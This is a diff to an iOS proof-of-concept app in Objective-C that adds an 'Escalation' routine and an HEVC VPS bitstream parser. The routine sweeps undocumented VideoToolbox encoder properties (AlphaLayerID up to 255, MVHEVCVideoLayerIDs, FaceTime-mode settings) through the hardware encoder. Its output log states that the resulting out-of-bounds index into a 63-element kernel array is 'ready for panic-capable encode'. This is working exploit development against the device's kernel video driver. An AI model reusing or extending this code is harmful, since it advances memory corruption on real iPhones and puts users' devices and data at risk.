@@ -1118,31 +1118,97 @@ static void dumpParamSetHex(const uint8_t *data, size_t len, NSString *label) {
     INFO(@"%@ (%zu bytes):\n          %@", label, len, hex);
 }
 
-// Parse HEVC VPS header and extract key fields
+// === Bit-accurate HEVC VPS parser ===
+typedef struct { const uint8_t *data; size_t len; size_t bit_pos; } BitReader;
+
+static uint32_t br_read(BitReader *br, int n) {
+    uint32_t val = 0;
+    for (int i = 0; i < n; i++) {
+        size_t byte_idx = br->bit_pos / 8;
+        int bit_idx = 7 - (br->bit_pos % 8);
+        if (byte_idx < br->len)
+            val = (val << 1) | ((br->data[byte_idx] >> bit_idx) & 1);
+        else
+            val <<= 1;
+        br->bit_pos++;
+    }
+    return val;
+}
+
+static uint32_t br_read_ue(BitReader *br) {
+    int lz = 0;
+    while (br_read(br, 1) == 0 && lz < 32) lz++;
+    if (lz == 0) return 0;
+    return (1u << lz) - 1 + br_read(br, lz);
+}
+
 static void parseHEVCVPS(const uint8_t *data, size_t len) {
-    if (len < 4) { INFO(@"  VPS too short to parse"); return; }
+    if (len < 6) { INFO(@"  VPS too short"); return; }
+    BitReader br = {data, len, 0};
 
-    // NAL header: 2 bytes (forbidden_zero_bit, nal_unit_type[6], nuh_layer_id[6], nuh_temporal_id_plus1[3])
-    uint8_t nal_type = (data[0] >> 1) & 0x3F;
-    INFO(@"  NAL type: %d (expect 32=VPS)", nal_type);
+    br_read(&br, 1);
+    uint32_t nal_type = br_read(&br, 6);
+    br_read(&br, 6);
+    br_read(&br, 3);
+    INFO(@"  NAL type: %u (expect 32=VPS)", nal_type);
 
-    // VPS payload starts at byte 2
-    // Bits: vps_video_parameter_set_id[4], vps_base_layer_internal_flag[1],
-    //       vps_base_layer_available_flag[1], vps_max_layers_minus1[6],
-    //       vps_max_sub_layers_minus1[3], vps_temporal_id_nesting_flag[1]
-    if (len < 4) return;
-    uint8_t vps_id = (data[2] >> 4) & 0x0F;
-    uint8_t base_internal = (data[2] >> 3) & 0x01;
-    uint8_t base_available = (data[2] >> 2) & 0x01;
-    // vps_max_layers_minus1 is 6 bits spanning bytes 2-3
-    uint8_t max_layers_minus1 = ((data[2] & 0x03) << 4) | ((data[3] >> 4) & 0x0F);
-    uint8_t max_sub_layers_minus1 = (data[3] >> 1) & 0x07;
-    uint8_t temporal_nesting = data[3] & 0x01;
+    uint32_t vps_id = br_read(&br, 4);
+    uint32_t base_internal = br_read(&br, 1);
+    uint32_t base_available = br_read(&br, 1);
+    uint32_t max_layers_minus1 = br_read(&br, 6);
+    uint32_t max_sub_layers_minus1 = br_read(&br, 3);
+    uint32_t temporal_nesting = br_read(&br, 1);
+    br_read(&br, 16);
 
-    INFO(@"  vps_id: %d", vps_id);
-    INFO(@"  vps_max_layers_minus1: %d (max_layer_id hint)", max_layers_minus1);
-    INFO(@"  vps_max_sub_layers_minus1: %d", max_sub_layers_minus1);
-    INFO(@"  vps_temporal_id_nesting_flag: %d", temporal_nesting);
+    INFO(@"  vps_id: %u", vps_id);
+    INFO(@"  vps_max_layers_minus1: %u", max_layers_minus1);
+    INFO(@"  vps_max_sub_layers_minus1: %u", max_sub_layers_minus1);
+    INFO(@"  vps_temporal_id_nesting_flag: %u", temporal_nesting);
+
+    br_read(&br, 2 + 1 + 5 + 32 + 4 + 44 + 8);
+
+    if (max_sub_layers_minus1 > 0) {
+        uint8_t profile_present[7], level_present[7];
+        for (uint32_t i = 0; i < max_sub_layers_minus1; i++) {
+            profile_present[i] = br_read(&br, 1);
+            level_present[i] = br_read(&br, 1);
+        }
+        if (max_sub_layers_minus1 < 8)
+            for (uint32_t i = max_sub_layers_minus1; i < 8; i++)
+                br_read(&br, 2);
+        for (uint32_t i = 0; i < max_sub_layers_minus1; i++) {
+            if (profile_present[i]) br_read(&br, 2+1+5+32+4+44);
+            if (level_present[i]) br_read(&br, 8);
+        }
+    }
+
+    uint32_t ordering_present = br_read(&br, 1);
+    uint32_t start_i = ordering_present ? 0 : max_sub_layers_minus1;
+    for (uint32_t i = start_i; i <= max_sub_layers_minus1; i++) {
+        br_read_ue(&br);
+        br_read_ue(&br);
+        br_read_ue(&br);
+    }
+
+    uint32_t vps_max_layer_id = br_read(&br, 6);
+    uint32_t vps_num_layer_sets_minus1 = br_read_ue(&br);
+
+    INFO(@"  *** vps_max_layer_id: %u (patch limit: <63) ***", vps_max_layer_id);
+    INFO(@"  vps_num_layer_sets_minus1: %u", vps_num_layer_sets_minus1);
+
+    if (vps_max_layer_id >= 63) {
+        PASS(@"  >>> OVER PATCH LIMIT! vps_max_layer_id=%u >= 63 <<<", vps_max_layer_id);
+    }
+
+    for (uint32_t i = 1; i <= vps_num_layer_sets_minus1; i++)
+        for (uint32_t j = 0; j <= vps_max_layer_id && j < 64; j++)
+            br_read(&br, 1);
+
+    uint32_t timing_present = br_read(&br, 1);
+    if (!timing_present) {
+        uint32_t ext_flag = br_read(&br, 1);
+        INFO(@"  vps_extension_flag: %u", ext_flag);
+    }
 }
 
 // Parse HEVC SPS header and extract key fields
@@ -1520,6 +1586,303 @@ static void runVerifyAndTrigger(void) {
     INFO(@"are proven delivered to the kernel driver.");
     pocLog(@"");
     INFO(@"Copy full log for analysis: long-press → Select All → Copy");
+}
+
+// ============================================================
+// ESCALATION: AlphaLayerID sweep + MVHEVCVideoLayerIDs oracle
+// ============================================================
+
+static void escalationOracleCallback(
+    void *ctx, void *sourceFrameRefCon, OSStatus status,
+    VTEncodeInfoFlags infoFlags, CMSampleBufferRef sampleBuffer) {
+    if (status != noErr) {
+        FAIL(@"[Escalation] Encode callback error: %d", (int)status);
+        return;
+    }
+    if (sampleBuffer) {
+        PASS(@"[Escalation] Got encoded output");
+        bitstreamOracle(sampleBuffer, g_oracleContext ?: @"unknown");
+    }
+}
+
+static CVPixelBufferRef createTestPixelBuffer(int w, int h) {
+    CVPixelBufferRef pb = NULL;
+    CVPixelBufferCreate(kCFAllocatorDefault, w, h,
+        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
+        (__bridge CFDictionaryRef)@{
+            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
+        }, &pb);
+    if (!pb) return NULL;
+    CVPixelBufferLockBaseAddress(pb, 0);
+    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+    if (y) memset(y, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+        CVPixelBufferGetHeightOfPlane(pb, 0));
+    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+    if (uv) memset(uv, 0x80,
+        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+        CVPixelBufferGetHeightOfPlane(pb, 1));
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+    return pb;
+}
+
+static void runEscalation(void) {
+    pocLog(@"");
+    pocLog(@"╔══════════════════════════════════════╗");
+    pocLog(@"║  ESCALATION: AlphaLayerID Sweep       ║");
+    pocLog(@"║  + MVHEVCVideoLayerIDs Oracle          ║");
+    pocLog(@"║  + FaceTime Mode Retry                 ║");
+    pocLog(@"╚══════════════════════════════════════╝");
+    pocLog(@"");
+    INFO(@"Goal: prove vps_max_layer_id tracks AlphaLayerID value");
+    INFO(@"and exceeds patch limit (<63) in emitted bitstream.");
+    pocLog(@"");
+
+    NSDictionary *spec = @{
+        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+    };
+
+    CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
+    if (!pb) { FAIL(@"Pixel buffer failed"); return; }
+
+    // === PART 1: AlphaLayerID sweep ===
+    int testValues[] = {0, 32, 62, 63, 64, 100, 200, 255};
+    int numTests = 8;
+
+    LOG(@"=== PART 1: AlphaLayerID Sweep (0..255) ===");
+    INFO(@"For each value: set → readback → encode → extract vps_max_layer_id");
+    pocLog(@"");
+
+    for (int t = 0; t < numTests; t++) {
+        int val = testValues[t];
+        LOG(@"--- AlphaLayerID = %d %s---", val,
+            val >= 63 ? "(OVER PATCH LIMIT) " : "");
+
+        VTCompressionSessionRef session = NULL;
+        OSStatus status = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+            escalationOracleCallback, NULL, &session);
+
+        if (status != noErr) {
+            FAIL(@"  Session failed: %d", (int)status);
+            continue;
+        }
+
+        status = VTSessionSetProperty(session,
+            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+            (__bridge CFTypeRef)@(val));
+        INFO(@"  SET: %s", status == noErr ? "OK" : "REJECTED");
+
+        if (status != noErr) {
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+            continue;
+        }
+
+        CFTypeRef readBack = NULL;
+        VTSessionCopyProperty(session,
+            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+            kCFAllocatorDefault, &readBack);
+        if (readBack) {
+            int rb = [(__bridge NSNumber *)readBack intValue];
+            INFO(@"  READBACK: %d %s", rb,
+                rb == val ? "(matches)" : "(CLAMPED!)");
+            CFRelease(readBack);
+        }
+
+        g_oracleContext = [NSString stringWithFormat:@"AlphaLayerID=%d", val];
+        status = VTCompressionSessionPrepareToEncodeFrames(session);
+        if (status == noErr) {
+            VTCompressionSessionEncodeFrame(session, pb,
+                CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+            VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+        } else {
+            FAIL(@"  PrepareToEncode failed: %d", (int)status);
+        }
+
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        pocLog(@"");
+    }
+
+    // === PART 2: Dedicated MVHEVCVideoLayerIDs oracle ===
+    LOG(@"=== PART 2: MVHEVCVideoLayerIDs Dedicated Oracle ===");
+    INFO(@"Testing with own session — previous Test C encode may have failed.");
+
+    {
+        VTCompressionSessionRef session = NULL;
+        OSStatus status = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+            escalationOracleCallback, NULL, &session);
+
+        if (status != noErr) {
+            FAIL(@"Session failed: %d", (int)status);
+        } else {
+            NSArray *layerIDs = @[@(0), @(100)];
+            status = VTSessionSetProperty(session,
+                CFSTR("MVHEVCVideoLayerIDs"),
+                (__bridge CFTypeRef)layerIDs);
+            INFO(@"SET MVHEVCVideoLayerIDs=[0,100]: %s",
+                status == noErr ? "OK" : "REJECTED");
+
+            CFTypeRef readBack = NULL;
+            VTSessionCopyProperty(session,
+                CFSTR("MVHEVCVideoLayerIDs"),
+                kCFAllocatorDefault, &readBack);
+            if (readBack) {
+                INFO(@"READBACK: %@", (__bridge id)readBack);
+                CFRelease(readBack);
+            }
+
+            g_oracleContext = @"MVHEVCLayerIDs=[0,100]";
+            status = VTCompressionSessionPrepareToEncodeFrames(session);
+            INFO(@"PrepareToEncode: %d", (int)status);
+            if (status == noErr) {
+                VTCompressionSessionEncodeFrame(session, pb,
+                    CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+            } else {
+                FAIL(@"PrepareToEncode failed — may need MVHEVC session config");
+            }
+
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+        }
+    }
+    pocLog(@"");
+
+    // === PART 3: RepFormatIndex combined with AlphaLayerID ===
+    LOG(@"=== PART 3: RepFormatIndex + AlphaLayerID Combined ===");
+    INFO(@"RepFormatIndex was dead alone — try in multi-layer mode.");
+
+    {
+        VTCompressionSessionRef session = NULL;
+        OSStatus status = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+            (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
+            escalationOracleCallback, NULL, &session);
+
+        if (status != noErr) {
+            FAIL(@"Session failed: %d", (int)status);
+        } else {
+            VTSessionSetProperty(session,
+                CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+                (__bridge CFTypeRef)@(64));
+            status = VTSessionSetProperty(session,
+                CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
+                (__bridge CFTypeRef)@(10));
+            INFO(@"SET AlphaLayerID=64 + RepFormatIndex=10");
+
+            CFTypeRef rb1 = NULL, rb2 = NULL;
+            VTSessionCopyProperty(session,
+                CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+                kCFAllocatorDefault, &rb1);
+            VTSessionCopyProperty(session,
+                CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
+                kCFAllocatorDefault, &rb2);
+            if (rb1) { INFO(@"AlphaLayerID readback: %@", (__bridge id)rb1); CFRelease(rb1); }
+            if (rb2) { INFO(@"RepFormatIndex readback: %@", (__bridge id)rb2); CFRelease(rb2); }
+
+            g_oracleContext = @"Alpha64+RepFmt10";
+            status = VTCompressionSessionPrepareToEncodeFrames(session);
+            if (status == noErr) {
+                VTCompressionSessionEncodeFrame(session, pb,
+                    CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+                INFO(@"Compare VPS with AlphaLayerID=64 alone — look for");
+                INFO(@"vps_num_rep_formats_minus1 change in extension.");
+            } else {
+                FAIL(@"PrepareToEncode failed: %d", (int)status);
+            }
+
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+        }
+    }
+    pocLog(@"");
+
+    // === PART 4: FaceTime mode retry ===
+    LOG(@"=== PART 4: FaceTime Usage Mode Retry ===");
+    INFO(@"UserDPB/UserRPS were rejected — may need FaceTime session.");
+
+    {
+        VTCompressionSessionRef session = NULL;
+        NSDictionary *ftSpec = @{
+            (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
+            (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
+        };
+
+        OSStatus status = VTCompressionSessionCreate(
+            kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
+            (__bridge CFDictionaryRef)ftSpec, NULL, kCFAllocatorDefault,
+            escalationOracleCallback, NULL, &session);
+
+        if (status != noErr) {
+            FAIL(@"Session failed: %d", (int)status);
+        } else {
+            VTSessionSetProperty(session, CFSTR("RealTime"), kCFBooleanTrue);
+            VTSessionSetProperty(session,
+                CFSTR("AllowOpenGOP"), kCFBooleanFalse);
+            VTSessionSetProperty(session,
+                CFSTR("AverageBitRate"), (__bridge CFTypeRef)@(500000));
+            VTSessionSetProperty(session,
+                CFSTR("MaxKeyFrameIntervalDuration"),
+                (__bridge CFTypeRef)@(2.0));
+            INFO(@"Set RealTime + low-latency (FaceTime-like config)");
+
+            NSArray *ftProps = @[
+                @"UserDPBFramesForFaceTime",
+                @"UserRPSForFaceTime",
+                @"UserParameterSetsIds"
+            ];
+            NSArray *ftVals = @[@(20), @(100), @(50)];
+            for (int i = 0; i < 3; i++) {
+                status = VTSessionSetProperty(session,
+                    (__bridge CFStringRef)ftProps[i],
+                    (__bridge CFTypeRef)ftVals[i]);
+                INFO(@"SET %@=%@: %s", ftProps[i], ftVals[i],
+                    status == noErr ? "OK" : "REJECTED");
+
+                if (status == noErr) {
+                    CFTypeRef rb = NULL;
+                    VTSessionCopyProperty(session,
+                        (__bridge CFStringRef)ftProps[i],
+                        kCFAllocatorDefault, &rb);
+                    if (rb) {
+                        INFO(@"  READBACK: %@", (__bridge id)rb);
+                        CFRelease(rb);
+                    }
+                }
+            }
+
+            g_oracleContext = @"FaceTimeMode";
+            status = VTCompressionSessionPrepareToEncodeFrames(session);
+            INFO(@"PrepareToEncode: %d", (int)status);
+            if (status == noErr) {
+                VTCompressionSessionEncodeFrame(session, pb,
+                    CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+            }
+
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+        }
+    }
+
+    CVPixelBufferRelease(pb);
+
+    pocLog(@"");
+    LOG(@"=== ESCALATION VERDICT ===");
+    INFO(@"Key question: does emitted vps_max_layer_id track AlphaLayerID?");
+    INFO(@"If vps_max_layer_id=255 when AlphaLayerID=255:");
+    INFO(@"  → kernel indexes a 63-element array at position 255");
+    INFO(@"  → OOB read/write by 192 elements = ~1536 bytes");
+    INFO(@"  → ready for panic-capable encode");
+    pocLog(@"");
+    INFO(@"Copy full log: long-press → Select All → Copy");
 }
 
 // ============================================================
@@ -1941,9 +2304,20 @@ static void runTier2Probe(void) {
 
     CGFloat row4 = row3 + btnH + gap;
 
+    UIButton *escalateBtn = [UIButton buttonWithType:UIButtonTypeSystem];
+    escalateBtn.frame = CGRectMake(pad, row4, btnW, btnH);
+    escalateBtn.backgroundColor = [UIColor colorWithRed:0.0 green:0.2 blue:0.0 alpha:1];
+    escalateBtn.layer.cornerRadius = 8;
+    escalateBtn.layer.borderWidth = 2;
+    escalateBtn.layer.borderColor = UIColor.greenColor.CGColor;
+    [escalateBtn setTitle:@"Escalate" forState:UIControlStateNormal];
+    [escalateBtn setTitleColor:UIColor.greenColor forState:UIControlStateNormal];
+    [escalateBtn addTarget:self action:@selector(runEscalate) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:escalateBtn];
+
     self.bothBtn = [UIButton buttonWithType:UIButtonTypeSystem];
-    self.bothBtn.frame = CGRectMake(pad, row4, w - pad * 2, btnH);
-    [self.bothBtn setTitle:@"Run Recon (Chroot + AVE2)" forState:UIControlStateNormal];
+    self.bothBtn.frame = CGRectMake(pad + btnW + gap, row4, btnW, btnH);
+    [self.bothBtn setTitle:@"Run Recon" forState:UIControlStateNormal];
     self.bothBtn.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1];
     self.bothBtn.layer.cornerRadius = 8;
     [self.bothBtn setTitleColor:UIColor.greenColor forState:UIControlStateNormal];
@@ -2001,6 +2375,12 @@ static void runTier2Probe(void) {
 - (void)runTier1b {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         runTier1bOOB();
+    });
+}
+
+- (void)runEscalate {
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        runEscalation();
     });
 }
 
